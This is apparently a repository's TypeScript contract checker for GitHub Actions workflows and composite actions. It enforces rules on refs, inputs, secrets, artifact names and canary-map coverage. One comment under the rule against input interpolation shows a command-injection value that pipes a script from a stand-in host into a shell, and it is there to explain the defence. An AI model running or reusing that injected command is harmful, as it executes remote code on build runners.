#!/usr/bin/env node
// Contract validation for this repository's reusable workflows and composite
// actions. See issue #3 for the rationale.
//
// actionlint checks that the YAML is *structurally* valid. It cannot see the
// bugs that actually cost us consumers, because every one of them was a valid
// document with a broken *interface*:
//
//   - a composite action using `uses: ./…`, which silently resolves against
//     the consumer's workspace instead of this repo
//   - `run: npm run ${{ inputs.command }}` with a default of
//     `npm run test:e2e:acceptance`, producing `npm run npm run …`
//   - a `required: true` secret a consumer cannot discover, so they guess
//     `secrets: inherit` and it does not work
//   - `@v1` on a repo that only publishes `vX.Y.Z`, which fails at
//     "Prepare all required actions" rather than at review time
//   - an artifact name interpolated straight from an input, where upload-artifact
//     rejects the `:` in a colon-delimited npm script name — and only on a
//     failing run, because the upload is `if: failure()`
//
// So: static analysis over `.github/**`, six rules, every violation reported
// with a file and line. Deliberately not a runtime test — see issue #5.

import { readFileSync, readdirSync, statSync, type Dirent } from 'node:fs'
import { join, relative, resolve } from 'node:path'
import { pathToFileURL } from 'node:url'
import { parseDocument, type Document } from 'yaml'
import { minimatch } from 'minimatch'

// If you fork this repo, update this constant (and the matching Dependabot
// `ignore` pattern) to your owner/repo, or rule 2 silently stops matching.
const SELF_REPO = 'The-Adult-In-The-Room/ci-workflows'

// A ref we are willing to resolve without asking a human: an exact semver tag,
// or a full commit SHA. Anything else — `main`, `master`, a floating `v1` —
// is a ref that can move or fail to exist under us.
const SHA_REF = /^[0-9a-f]{40}$/
const SEMVER_TAG = /^v\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?$/

const SKIP_DIRS = new Set(['node_modules', '.git'])

// Actions whose `name` input upload-artifact/download-artifact require to be
// filesystem-agnostic. Matched on owner/repo, so a pinned or floating tag is
// irrelevant — the constraint is the action's, not the ref's.
const ARTIFACT_ACTIONS = new Set(['actions/upload-artifact', 'actions/download-artifact'])

// A `${{ … }}` expression, and the `inputs.` references inside one. The
// lookbehind keeps `github.event.inputs.foo` from being read as a reference to a
// declared input, which is the one realistic false positive here.
const EXPRESSION = /\$\{\{([\s\S]*?)\}\}/g
const INPUT_REFERENCE = /(?<![\w.])inputs\.([A-Za-z0-9_-]+)/g

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type PathSegment = string | number
type Path = PathSegment[]

type YamlValue = unknown
type YamlMap = Record<string, YamlValue>

interface Violation {
  file: string
  rule: string
  message: string
  line: number
  column: number
}

interface Input {
  name: string
  path: Path
  hasDefault: boolean
  defaultValue: string | null
  required: boolean
  hasType: boolean
}

interface Secret {
  name: string
  path: Path
  required: boolean
  description: string
}

interface Step {
  step: YamlMap
  path: Path
}

interface FoundValue<T = YamlValue> {
  value: T
  path: Path
}

interface Position {
  line: number
  column: number
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const inputReferences = (expression: string): string[] =>
  [...expression.matchAll(INPUT_REFERENCE)].map(([, name]) => name)

const isPlainObject = (value: YamlValue): value is YamlMap =>
  typeof value === 'object' && value !== null && !Array.isArray(value)

/** Maps character offsets in `text` to 1-based line/column pairs. */
function positionResolver(text: string): (offset: number) => Position {
  const lineStarts: number[] = [0]
  for (let i = 0; i < text.length; i++) {
    if (text[i] === '\n') lineStarts.push(i + 1)
  }
  return (offset: number) => {
    let low = 0
    let high = lineStarts.length - 1
    while (low < high) {
      const mid = (low + high + 1) >> 1
      if (lineStarts[mid] <= offset) low = mid
      else high = mid - 1
    }
    return { line: low + 1, column: offset - lineStarts[low] + 1 }
  }
}

/**
 * Depth-first search for every value stored under a given mapping key,
 * regardless of type. Filter with `isStringLeaf` when only scalars will do.
 */
function findByKey(
  value: YamlValue,
  path: Path,
  key: string,
  found: FoundValue[] = [],
): FoundValue[] {
  if (Array.isArray(value)) {
    value.forEach((item, index) => findByKey(item, [...path, index], key, found))
  } else if (isPlainObject(value)) {
    for (const [childKey, childValue] of Object.entries(value)) {
      const childPath: Path = [...path, childKey]
      if (childKey === key) found.push({ value: childValue, path: childPath })
      findByKey(childValue, childPath, key, found)
    }
  }
  return found
}

const isStringLeaf = (found: FoundValue): found is FoundValue<string> =>
  typeof found.value === 'string'

/** Every string scalar at or below `value`, with its path. */
function findStringLeaves(
  value: YamlValue,
  path: Path,
  found: FoundValue<string>[] = [],
): FoundValue<string>[] {
  if (typeof value === 'string') {
    found.push({ value, path })
  } else if (Array.isArray(value)) {
    value.forEach((item, index) => findStringLeaves(item, [...path, index], found))
  } else if (isPlainObject(value)) {
    for (const [key, child] of Object.entries(value)) {
      findStringLeaves(child, [...path, key], found)
    }
  }
  return found
}

/**
 * Gathers the input definitions a document declares. Composite actions declare
 * them at the top level; workflows declare them per trigger.
 */
function collectInputs(root: YamlMap): Map<string, Input> {
  const inputs = new Map<string, Input>()

  const record = (definitions: YamlValue, basePath: Path): void => {
    if (!isPlainObject(definitions)) return
    for (const [name, definition] of Object.entries(definitions)) {
      const def = isPlainObject(definition) ? definition : {}
      inputs.set(name, {
        name,
        path: [...basePath, name],
        hasDefault: Object.hasOwn(def, 'default'),
        defaultValue: typeof def.default === 'string' ? def.default : null,
        required: def.required === true,
        hasType: Object.hasOwn(def, 'type'),
      })
    }
  }

  record(root.inputs, ['inputs'])
  if (isPlainObject(root.on)) {
    for (const [triggerName, trigger] of Object.entries(root.on)) {
      record(isPlainObject(trigger) ? trigger.inputs : undefined, ['on', triggerName, 'inputs'])
    }
  }
  return inputs
}

function collectSecrets(root: YamlMap): Secret[] {
  const secrets: Secret[] = []
  if (!isPlainObject(root.on)) return secrets
  for (const [triggerName, trigger] of Object.entries(root.on)) {
    const triggerSecrets = isPlainObject(trigger) ? trigger.secrets : undefined
    if (!isPlainObject(triggerSecrets)) continue
    for (const [name, definition] of Object.entries(triggerSecrets)) {
      const def = isPlainObject(definition) ? definition : {}
      secrets.push({
        name,
        path: ['on', triggerName, 'secrets', name],
        required: def.required === true,
        description: typeof def.description === 'string' ? def.description.trim() : '',
      })
    }
  }
  return secrets
}

const describe = (input: Input): string =>
  input.hasDefault ? `default ${JSON.stringify(input.defaultValue)}` : 'no default'

/**
 * Every step in the document, with its path. Workflow steps hang off each job;
 * a composite action has a single `runs.steps` list instead.
 */
function collectSteps(root: YamlMap): Step[] {
  const steps: Step[] = []
  const jobs = isPlainObject(root.jobs) ? root.jobs : {}
  for (const [jobName, job] of Object.entries(jobs)) {
    const stepList = isPlainObject(job) && Array.isArray(job.steps) ? job.steps : []
    for (const [index, step] of stepList.entries()) {
      if (isPlainObject(step)) steps.push({ step, path: ['jobs', jobName, 'steps', index] })
    }
  }
  const runs = isPlainObject(root.runs) ? root.runs : {}
  const runsSteps = Array.isArray(runs.steps) ? runs.steps : []
  for (const [index, step] of runsSteps.entries()) {
    if (isPlainObject(step)) steps.push({ step, path: ['runs', 'steps', index] })
  }
  return steps
}

function nodeStartOffset(node: YamlValue): number {
  if (node === null || typeof node !== 'object' || Array.isArray(node)) return 0
  const range = (node as { range?: [number, number, number] | null }).range
  return range?.[0] ?? 0
}

// ---------------------------------------------------------------------------
// Analysis
// ---------------------------------------------------------------------------

/**
 * Checks one YAML document. Returns a flat list of violations, each carrying
 * the rule id, message, and source position.
 */
export function analyzeSource(text: string, { file = '<input>' }: { file?: string } = {}): Violation[] {
  const doc: Document.Parsed = parseDocument(text)
  const positionAt = positionResolver(text)
  const violations: Violation[] = []

  const report = (rule: string, message: string, path: Path): void => {
    const node = doc.getIn(path, true)
    const { line, column } = positionAt(nodeStartOffset(node))
    violations.push({ file, rule, message, line, column })
  }

  // A file we cannot parse would otherwise pass every rule vacuously.
  //
  // The `lint` job now runs mpalmer/action-validator against the composite
  // actions under `.github/actions`, so those files get proper schema
  // validation. `parse-error` remains as a backstop: it keeps the contract
  // checker from silently swallowing unparseable YAML, and it lets `npm run
  // contract` surface gross syntax errors even when action-validator is not
  // installed locally.
  for (const error of doc.errors) {
    const { line, column } = positionAt(error.pos?.[0] ?? 0)
    violations.push({
      file,
      rule: 'parse-error',
      message: error.message.split('\n')[0],
      line,
      column,
    })
  }
  if (doc.errors.length > 0) return violations

  const root = (doc.toJS() ?? {}) as YamlMap
  const inputs = collectInputs(root)
  const isCompositeAction = isPlainObject(root.runs) && root.runs.using === 'composite'
  const declaresWorkflowCallInputs =
    isPlainObject(root.on) && isPlainObject(root.on.workflow_call) && isPlainObject(root.on.workflow_call.inputs)
  const usesRefs = findByKey(root, [], 'uses').filter(isStringLeaf)
  const runSteps = findByKey(root, [], 'run').filter(isStringLeaf)

  // Rule 1 — no relative `uses:` inside a composite action.
  //
  // A workflow may legitimately use `uses: ./.github/workflows/x.yml`; that
  // resolves within the same repo. A *composite action* may not, because its
  // steps run in the consumer's checkout, where that path means something else.
  if (isCompositeAction) {
    for (const { value, path } of usesRefs) {
      if (value.startsWith('./')) {
        report(
          'no-relative-uses-in-composite-action',
          `relative \`uses: ${value}\` resolves against the consumer's workspace, not this repo; use a fully qualified ${SELF_REPO}/…@<tag> reference`,
          path,
        )
      }
    }
  }

  for (const { value, path } of usesRefs) {
    // Rule 2 — self-references must be immutable tags or SHAs.
    if (!value.startsWith(`${SELF_REPO}/`)) continue
    const ref = value.slice(SELF_REPO.length + 1).split('@')[1]
    if (ref === undefined || SEMVER_TAG.test(ref) || SHA_REF.test(ref)) continue
    report(
      'no-branch-refs-for-self-references',
      `self-reference \`${value}\` uses ref \`${ref}\`, which is neither an exact semver tag nor a commit SHA; branch and floating refs break every consumer pinned to the current release`,
      path,
    )
  }

  // Rule 3 — input completeness.
  //
  // An input handed to something that will execute must be impossible to omit:
  // either a `default`, or `required: true`. That covers both consumption sites
  // — a `run:` body, and a `with:` value forwarded into another action.
  //
  // (The issue text says only "every input forwarded into a `run:` has a
  // `default`", but `playwright-test`'s `command` is required with no default,
  // so the literal reading rejects a correct file; and `verify.yml` forwards
  // `node-version-file` through `with:`, which the narrow reading misses
  // entirely. The intent is that omission cannot produce a half-formed command,
  // and `required: true` satisfies that.)
  if (declaresWorkflowCallInputs) {
    for (const input of inputs.values()) {
      if (!input.hasType) {
        report(
          'input-completeness',
          `workflow_call input \`${input.name}\` does not declare a \`type\``,
          input.path,
        )
      }
    }
  }

  const consumptionSites: FoundValue<string>[] = [
    ...runSteps,
    // `with:` values are the other way an input's value gets consumed, and the
    // more dangerous one: an empty `node-version-file` reaches setup-node as an
    // empty string rather than as a visible syntax error.
    ...findByKey(root, [], 'with').flatMap(({ value, path }) => findStringLeaves(value, path)),
  ]

  for (const { value, path } of consumptionSites) {
    for (const expression of value.matchAll(EXPRESSION)) {
      for (const name of inputReferences(expression[1])) {
        const input = inputs.get(name)
        if (!input) {
          report(
            'input-completeness',
            `references \`inputs.${name}\`, which is not a declared input`,
            path,
          )
        } else if (!input.hasDefault && !input.required) {
          report(
            'input-completeness',
            `forwards \`inputs.${name}\` (${describe(input)}) into something that executes it, so omitting it produces a half-formed command; add a \`default\` or set \`required: true\``,
            path,
          )
        }
      }
    }
  }

  for (const { value, path } of runSteps) {
    // Rule 4 — script-name discipline.
    //
    // An input spliced after a literal `npm run` must carry a bare script name.
    // A default that already contains `npm run` yields `npm run npm run …`.
    for (const expression of value.matchAll(EXPRESSION)) {
      if (!/\bnpm\s+run\s*$/.test(value.slice(0, expression.index))) continue
      for (const name of inputReferences(expression[1])) {
        const input = inputs.get(name)
        if (input?.defaultValue && /\bnpm\s+run\b/.test(input.defaultValue)) {
          report(
            'script-name-discipline',
            `input \`${name}\` is spliced after \`npm run\` but defaults to \`${input.defaultValue}\`, producing \`npm run ${input.defaultValue}\`; the default must be a bare script name`,
            [...input.path, 'default'],
          )
        }
      }
    }
  }

  // Rule 5 — required secrets are documented.
  //
  // This does not stop a consumer passing the wrong secrets; it makes the
  // contract discoverable instead of tribal knowledge.
  for (const secret of collectSecrets(root)) {
    if (secret.required && secret.description === '') {
      report(
        'required-secrets-documented',
        `required secret \`${secret.name}\` has no \`description\`, so consumers cannot tell what to pass`,
        secret.path,
      )
    }
  }

  // Rule 7 — no input interpolation in run bodies.
  //
  // GitHub substitutes `${{ inputs.* }}` into the script body *before* bash
  // parses it, so any shell metacharacter in the input executes. A `command`
  // of `test:e2e:smoke; curl evil.example/x.sh | sh` runs the suite, then
  // pipes a downloaded script into a shell. The value is set by the consuming
  // repository's workflow file, so this is not a privilege boundary crossing
  // today — but it becomes one the moment any workflow builds the value from
  // something less trusted (a `workflow_dispatch` input, a matrix value
  // derived from a branch name, a repository variable).
  //
  // The fix is to route the value through the environment instead of the
  // script body: `env: COMMAND: ${{ inputs.command }}` with `run: npm run
  // "$COMMAND"`. The env block is evaluated by GitHub's expression engine and
  // written to the container's environment; bash reads the value at runtime,
  // where quoting prevents word-splitting and glob expansion.
  //
  // `steps.*.outputs.*` is allowed — those values are produced by the workflow
  // itself, not by a caller. `secrets.*` is also allowed for the same reason.
  for (const { value, path } of runSteps) {
    for (const expression of value.matchAll(EXPRESSION)) {
      for (const input of inputReferences(expression[1])) {
        report(
          'no-inputs-in-run-body',
          `\`inputs.${input}\` is interpolated into a \`run:\` body, where GitHub substitutes it before bash parses the script; route it through \`env:\` instead and reference \`"$${input.toUpperCase().replace(/-/g, '_')}"\``,
          path,
        )
      }
    }
  }

  // Rule 6 — artifact names must not interpolate an input.
  //
  // `upload-artifact` rejects `" : < > | * ? \r \n \ /` in a name outright,
  // because downloads land on NTFS volumes where those are path separators or
  // reserved characters. Whether an input carries one is unknowable at review
  // time — `test:e2e:regression` is a perfectly good npm script name and an
  // invalid artifact name — so the only sound rule is that an input must not
  // reach the name unchecked.
  //
  // Note this bites hardest exactly when it is least visible: the upload is
  // `if: failure()`, so a green run never evaluates the name and the contract
  // only breaks on the run where someone needs the report.
  //
  // The fix is to derive the name in a step and forward the *output*, which is
  // the one value this document controls. `steps.*.outputs.*` is therefore
  // allowed, and `inputs.*` is not.
  for (const { step, path } of collectSteps(root)) {
    if (typeof step.uses !== 'string') continue
    const ownerRepo = step.uses.split('@')[0]
    if (!ARTIFACT_ACTIONS.has(ownerRepo)) continue

    const withBlock = isPlainObject(step.with) ? step.with : {}
    const name = withBlock.name
    if (typeof name !== 'string') continue

    for (const expression of name.matchAll(EXPRESSION)) {
      for (const input of inputReferences(expression[1])) {
        report(
          'artifact-name-safety',
          `artifact name interpolates \`inputs.${input}\`, whose runtime value cannot be checked against the characters upload-artifact rejects (" : < > | * ? \\r \\n \\ /); derive a sanitised name in a step and pass \`steps.<id>.outputs.<name>\` instead`,
          [...path, 'with', 'name'],
        )
      }
    }
  }

  return violations
}

/** Every `.yml`/`.yaml` file under a path, recursively. */
export function yamlFilesUnder(target: string): string[] {
  const stats = statSync(target)
  if (stats.isFile()) return [target]
  if (!stats.isDirectory()) return []

  return readdirSync(target, { withFileTypes: true }).flatMap((entry: Dirent) => {
    if (entry.isDirectory()) {
      return SKIP_DIRS.has(entry.name) ? [] : yamlFilesUnder(join(target, entry.name))
    }
    return /\.ya?ml$/.test(entry.name) ? [join(target, entry.name)] : []
  })
}

/** Checks every workflow and action definition at or under the given paths. */
export function checkPaths(paths: string[]): Violation[] {
  const cwd = process.cwd()
  return paths
    .flatMap((path) => yamlFilesUnder(path))
    .flatMap((path) =>
      analyzeSource(readFileSync(path, 'utf8'), { file: relative(cwd, path) || path }),
    )
}

// ---------------------------------------------------------------------------
// Canary map coverage
// ---------------------------------------------------------------------------

interface CanaryRule {
  targets?: string[]
  paths?: string[]
}

/**
 * Rule 8 — canary map coverage.
 *
 * Every consumer-facing workflow and composite action must have at least one
 * rule in `.github/_canary-map.yml`. Internal workflows (prefixed with `_`) are
 * excluded. The canary dispatcher runs on every PR and uses the map to determine
 * which workflows to test in the blog canary environment.
 *
 * This rule ensures that new workflows and actions are explicitly covered by
 * the selective dispatch, preventing silent gaps when the map is stale.
 */
export function checkCanaryMapCoverage(): Violation[] {
  const violations: Violation[] = []
  const cwd = process.cwd()
  const mapFile = join(cwd, '.github/_canary-map.yml')

  // Read the canary map
  let mapContent: string
  try {
    mapContent = readFileSync(mapFile, 'utf8')
  } catch (error) {
    if (isNodeError(error) && error.code === 'ENOENT') {
      // Map doesn't exist — skip this check
      return violations
    }
    throw error
  }

  const mapDoc = parseDocument(mapContent)
  const mapData = mapDoc.toJS() as { rules?: CanaryRule[] } | undefined
  const rules = mapData?.rules || []

  // Collect all paths covered by the map
  const coveredPaths = new Set<string>()
  for (const rule of rules) {
    if (Array.isArray(rule.paths)) {
      for (const pattern of rule.paths) {
        coveredPaths.add(pattern)
      }
    }
  }

  // Helper to check if a file is covered by any pattern
  const isCovered = (filePath: string): boolean => {
    for (const pattern of coveredPaths) {
      if (minimatch(filePath, pattern, { matchBase: false })) {
        return true
      }
    }
    return false
  }

  // Check consumer-facing workflows
  const workflowsDir = join(cwd, '.github/workflows')
  try {
    const workflows = readdirSync(workflowsDir)
    for (const workflow of workflows) {
      if (!workflow.endsWith('.yml') && !workflow.endsWith('.yaml')) continue
      if (workflow.startsWith('_')) continue // Skip internal workflows

      const workflowPath = `.github/workflows/${workflow}`
      if (!isCovered(workflowPath)) {
        violations.push({
          file: workflowPath,
          rule: 'canary-map-coverage',
          message: `consumer-facing workflow \`${workflow}\` is not covered by any rule in \`.github/_canary-map.yml\`; add a rule mapping this file to canary targets`,
          line: 1,
          column: 1,
        })
      }
    }
  } catch (error) {
    if (isNodeError(error) && error.code !== 'ENOENT') throw error
  }

  // Check composite actions
  const actionsDir = join(cwd, '.github/actions')
  try {
    const actions = readdirSync(actionsDir, { withFileTypes: true })
    for (const action of actions) {
      if (!action.isDirectory()) continue

      const actionPath = `.github/actions/${action.name}`
      if (!isCovered(`${actionPath}/**`)) {
        violations.push({
          file: actionPath,
          rule: 'canary-map-coverage',
          message: `composite action \`${action.name}\` is not covered by any rule in \`.github/_canary-map.yml\`; add a rule mapping this action to canary targets`,
          line: 1,
          column: 1,
        })
      }
    }
  } catch (error) {
    if (isNodeError(error) && error.code !== 'ENOENT') throw error
  }

  return violations
}

function isNodeError(error: unknown): error is NodeJS.ErrnoException {
  return error instanceof Error && 'code' in error
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

function main(argv: string[]): number {
  const targets = argv.length > 0 ? argv : ['.github']
  let violations: Violation[]
  try {
    violations = checkPaths(targets)
  } catch (error) {
    if (isNodeError(error) && error.code === 'ENOENT') {
      console.error(`contract: no such file or directory: ${error.path ?? error.message}`)
      return 2
    }
    throw error
  }

  // Add canary map coverage violations
  try {
    const canaryViolations = checkCanaryMapCoverage()
    violations = violations.concat(canaryViolations)
  } catch (error) {
    console.error(`contract: error checking canary map coverage: ${(error as Error).message}`)
    return 2
  }

  if (violations.length === 0) {
    console.log(`contract: ${targets.join(', ')} satisfies every rule.`)
    return 0
  }

  const width = Math.max(...violations.map((v) => `${v.file}:${v.line}:${v.column}`.length))
  for (const { file, rule, message, line, column } of violations) {
    console.error(`${`${file}:${line}:${column}`.padEnd(width)}  [${rule}]\n    ${message}`)
  }
  console.error(`\ncontract: ${violations.length} violation(s).`)
  return 1
}

if (process.argv[1] && import.meta.url === pathToFileURL(resolve(process.argv[1])).href) {
  process.exit(main(process.argv.slice(2)))
}
